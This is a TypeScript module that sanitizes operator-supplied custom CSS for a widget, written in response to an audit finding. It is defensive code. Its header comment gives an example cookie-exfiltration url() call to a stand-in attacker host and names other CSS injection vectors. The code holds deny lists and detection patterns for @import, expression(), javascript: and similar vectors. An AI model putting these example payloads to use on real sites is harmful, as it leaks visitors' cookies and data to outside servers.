/**
 * Custom-CSS sanitization for tenant widget themes.
 *
 * Audit P1-21: the `update_custom_css` agent tool stored arbitrary CSS into
 * tenants.widget_custom_css and the widget injected it as a `<style>` tag.
 * CSS isn't script, but it's exfiltrative and clickjack-shaped:
 *
 *   - `background: url("https://attacker.example/?cookie=...")` leaks data
 *     to attacker-controlled servers via the browser's image-load request.
 *   - `@import url("...")` chains arbitrary stylesheets; on Firefox can
 *     also fire-and-forget side-channel timing oracles.
 *   - `expression(alert(1))` in IE (still relevant for some older webview
 *     embeds and rebroadcasted HTML emails).
 *   - `position: fixed; top: 0; height: 100%; ...` overlay clickjacking on
 *     the host page; not stoppable by CSS alone but harder if the iframe
 *     boundary is preserved (we don't always have one).
 *
 * Design:
 *
 *   1. Strip dangerous at-rules: @import, @charset, @namespace, @document
 *      (Firefox-only but used to bypass site CSP), and known IE/legacy
 *      hooks like behavior:, -moz-binding, filter: progid:.
 *   2. Strip expression(...) and javascript: anywhere.
 *   3. Walk url(...) references and refuse anything outside an allowlist:
 *        - data: URIs (no network, safe for inline icons)
 *        - https://fonts.gstatic.com/...    (Google Fonts assets)
 *        - https://fonts.googleapis.com/... (Google Fonts CSS)
 *      Anything else (http://, attacker.example, file://, raw IPs) is
 *      replaced with `url(about:blank)` — same parse shape, no exfil path.
 *   4. Strip `<` and `>` outright. CSS doesn't legitimately contain HTML
 *      angle brackets except in attr() selectors, and the operator-edit
 *      use case doesn't need those. Closes the script-tag-injection
 *      surface entirely.
 *   5. Length cap. Operators get 64KB of CSS; anything beyond is bug-shaped.
 *
 * NOT a real CSS parser. The token shapes we care about (url, @import,
 * expression, etc.) are simple enough to handle with regex; the rest of
 * the CSS is preserved verbatim. If a future attack requires parser-level
 * understanding (e.g., abusing CSS specificity to overlay a phishing form),
 * we'll switch to postcss-safe-parser then.
 *
 * The function returns a result object with the sanitized CSS plus a list
 * of warnings — callers can surface those to operators ("we stripped 2
 * url() refs from your CSS, here's why") so they can fix their input.
 */

export interface CssSanitizeResult {
  /** The cleaned CSS, safe to inject as a <style> tag. */
  css: string
  /** Counts of each rejected pattern. Empty when input was clean. */
  warnings: Array<{ kind: string; count: number; sample?: string }>
}

const MAX_CSS_BYTES = 64 * 1024 // 64KB

// Dangerous at-rules. Each is matched as `@<name>` followed by everything up
// to (and including) the matching closing brace OR the next semicolon — CSS
// at-rules end with either, depending on form (e.g. `@import url(...);` vs
// `@font-face { ... }`). We replace with a comment marker so downstream
// stylesheets still parse.
const DANGEROUS_AT_RULES = [
  'import',
  'charset',
  'namespace',
  'document', // Firefox-only, used for site-CSP bypass and ad-blocker fingerprinting
]

const URL_ALLOWLIST_HOSTS = new Set([
  'fonts.gstatic.com',
  'fonts.googleapis.com',
])

function isAllowedUrlValue(rawValue: string): boolean {
  // Strip quotes and surrounding whitespace.
  const v = rawValue.trim().replace(/^["']|["']$/g, '').trim()
  if (!v) return false
  if (v.toLowerCase().startsWith('data:')) return true
  if (v.toLowerCase().startsWith('https://')) {
    try {
      const u = new URL(v)
      return URL_ALLOWLIST_HOSTS.has(u.hostname.toLowerCase())
    } catch {
      return false
    }
  }
  return false
}

/**
 * Sanitize operator-supplied CSS for the widget. Returns the cleaned CSS
 * plus a structured list of what was stripped (so the UI can show "we
 * removed N url() references pointing to non-allowlisted hosts").
 */
export function sanitizeCustomCss(input: string): CssSanitizeResult {
  if (typeof input !== 'string') {
    return { css: '', warnings: [{ kind: 'non-string-input', count: 1 }] }
  }

  // Apply the byte cap up front. CSS over the cap is almost certainly bug
  // or attack; refuse rather than try to truncate (mid-rule truncation
  // produces parse errors).
  if (input.length > MAX_CSS_BYTES) {
    return {
      css: '',
      warnings: [{ kind: 'too-long', count: 1, sample: `${input.length} > ${MAX_CSS_BYTES}` }],
    }
  }

  let css = input
  const warnings: CssSanitizeResult['warnings'] = []

  // 1. Strip < and > outright — CSS doesn't need them, and they're the
  // primary route for HTML/script smuggling via `</style><script>`.
  const angleBracketCount = (css.match(/[<>]/g) ?? []).length
  if (angleBracketCount > 0) {
    css = css.replace(/[<>]/g, '')
    warnings.push({ kind: 'angle-brackets-stripped', count: angleBracketCount })
  }

  // 2. Strip dangerous @-rules.
  for (const rule of DANGEROUS_AT_RULES) {
    // Match @<rule> ... ; (single-line form) OR @<rule> ... { ... } (block form).
    // The single-line form is `@import url(...);` etc; the block form is for
    // rules like @namespace { ... } in CSS3 (rare but valid).
    const inlineRe = new RegExp(`@${rule}\\s+[^;{]*;`, 'gi')
    const blockRe = new RegExp(`@${rule}\\s+[^{]*\\{[^}]*\\}`, 'gi')

    let stripped = 0
    css = css.replace(inlineRe, () => { stripped++; return '' })
    css = css.replace(blockRe, () => { stripped++; return '' })
    if (stripped > 0) {
      warnings.push({ kind: `at-${rule}-stripped`, count: stripped })
    }
  }

  // Replacement marker for stripped declarations. Empty rather than a
  // descriptive comment so the dangerous KEYWORD (expression, javascript)
  // doesn't survive as a string in the output. Some downstream consumers
  // grep for these names to gate cleanup; an empty-string strip is safest.
  const STRIPPED = ''

  // 3. Strip expression(...) — IE-era JS-in-CSS. Greedy match across the
  // smallest balanced parentheses pair (CSS expressions don't legitimately
  // nest parens past one level in the wild; if they do, we still strip the
  // outermost which neutralizes the threat).
  const expressionCount = (css.match(/\bexpression\s*\(/gi) ?? []).length
  if (expressionCount > 0) {
    css = css.replace(/\bexpression\s*\([^)]*\)/gi, STRIPPED)
    warnings.push({ kind: 'expression-stripped', count: expressionCount })
  }

  // 4. Strip the IE filter:progid attack vector. Modern browsers ignore
  // these but old corporate webviews still parse them.
  const filterProgIdCount = (css.match(/\bfilter\s*:\s*progid\s*:/gi) ?? []).length
  if (filterProgIdCount > 0) {
    css = css.replace(/\bfilter\s*:\s*progid\s*:[^;}]*/gi, STRIPPED)
    warnings.push({ kind: 'filter-progid-stripped', count: filterProgIdCount })
  }

  // 5. Strip behavior: / -moz-binding: (HTC / XBL injection).
  //
  // The lookbehind (?<!\w) anchors to a non-word position BEFORE the
  // property name. For `-moz-binding`, the leading `-` isn't a word char,
  // so the standard \b boundary doesn't match between a preceding space
  // and the `-` (both are non-word, no transition). Using `(?<!\w)` works
  // for both -prefixed and plain properties.
  for (const prop of ['behavior', '-moz-binding']) {
    const re = new RegExp(`(?<!\\w)${prop.replace(/-/g, '\\-')}\\s*:[^;}]*`, 'gi')
    const count = (css.match(re) ?? []).length
    if (count > 0) {
      css = css.replace(re, STRIPPED)
      warnings.push({ kind: `${prop}-stripped`, count })
    }
  }

  // 6. Strip javascript: scheme anywhere it appears. Catches the obscure
  // case of background-image: url('javascript:alert(1)') etc.
  const jsSchemeCount = (css.match(/javascript\s*:/gi) ?? []).length
  if (jsSchemeCount > 0) {
    css = css.replace(/javascript\s*:[^;}'")]*/gi, STRIPPED)
    warnings.push({ kind: 'javascript-scheme-stripped', count: jsSchemeCount })
  }

  // 7. Walk url(...) references and replace any non-allowlisted target with
  // url(about:blank). Same parse shape, no exfil path.
  let urlsRewritten = 0
  let urlsKept = 0
  css = css.replace(/\burl\s*\(\s*([^)]*?)\s*\)/gi, (_match, value) => {
    if (isAllowedUrlValue(value)) {
      urlsKept++
      return `url(${value})`
    }
    urlsRewritten++
    return 'url(about:blank)'
  })
  if (urlsRewritten > 0) {
    warnings.push({
      kind: 'url-rewritten-to-about-blank',
      count: urlsRewritten,
      sample: `${urlsRewritten} non-allowlisted url() rewritten; ${urlsKept} allowlisted kept`,
    })
  }

  return { css, warnings }
}
